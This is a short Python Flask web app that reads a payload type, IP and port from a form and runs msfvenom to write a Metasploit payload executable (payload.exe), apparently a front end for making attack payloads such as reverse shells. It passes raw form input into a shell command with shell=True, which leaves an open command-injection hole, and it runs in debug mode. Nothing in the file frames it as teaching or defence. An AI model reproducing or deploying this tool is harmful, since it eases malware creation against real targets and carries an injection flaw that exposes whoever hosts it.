from flask import Flask, render_template, request
import subprocess

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/execute', methods=['POST'])
def execute_payload():
    payload = request.form.get('payload')
    target_ip = request.form.get('target_ip')
    target_port = request.form.get('target_port')

    # Build the metasploit command
    msf_command = f"msfvenom -p {payload} LHOST={target_ip} LPORT={target_port} -f exe > payload.exe"

    # Execute the metasploit command
    subprocess.call(msf_command, shell=True)

    return "Payload created successfully!"

if __name__ == '__main__':
    app.run(debug=True)

